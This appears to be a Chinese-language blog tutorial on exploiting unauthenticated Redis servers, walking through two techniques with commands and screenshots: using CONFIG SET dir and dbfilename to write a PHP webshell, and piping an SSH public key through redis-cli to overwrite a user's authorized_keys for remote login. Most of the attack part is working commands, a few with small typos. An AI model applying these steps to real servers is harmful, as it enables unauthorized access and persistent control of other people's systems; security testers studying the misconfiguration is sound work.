# REDIS 未授权   
这个其实是一个老生常谈的问题了  
不管在那个地方的内网一扫绝对一大把这个漏洞  
本质原因是**redis默认配置就是未授权的**  
## 利用    
redis未授权的利用核心要素是利用未授权往redis服务器当中写入文件数据  
举例子  
![20211026214147](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211026214147.png)  
### 写入webshell  
登录远程的服务器并且检测连接是否是畅通的  config get *查看其中的配置项    
![20211026214244](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211026214244.png)  

```
利用config set   
config set dir directory #设置写入的目录  
config set dbfilename a.php # 设置写入的文件名称  
set xxx (数据)  save 进行保存    
```
![20211026214119](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211026214119.png)  

#### 注意
1.前提是在靶机的redis服务器必须有在某个目录写入文件的权利  
2.写入的文件当中存在很多的其他的padding字符，只能适用于容错性比较高的结果  



### 写入sshkey进行提权    
本质还是写入文件进行存储 但是要将本地文件当中存在的数据放上去不能光是使用赋值的方法   
#### echo -e 
因为文件比较大的原因需要使用  
echo – e 将输出的命令进行转义 echo -e “\n\n” 意思就是打印换行符  
```

(echo -e; “\n\n” cat /.ssh/authorized_keys;echo -e;)  > a.txt    #将命令执行的结果输出到一个文件当中 
```
注意 echo -e 的转义功能，这里输出\n的目的也是为了让该文件离padding远一点的原因吧   加上双括号的意思是为了让所有的输出都能够保存到文件当中  
经过这样处理的结果会变为这样  
  ![20211026214432](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211026214432.png)  
  然后我们将这个文件当中的内容通过redis放到靶机的某个文件当中   
```  
在linux当中将某个文件当中的内容放到redis的命令  
cat file_name | redis-cli -h ip -x set kk  
然后登陆远程的主机设置好库和文件就行了  
CONFIG SET dir /home/user/.ssh 
CONFIG SET dbfilename authorized_keys save  
```  
![20211026214652](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211026214652.png)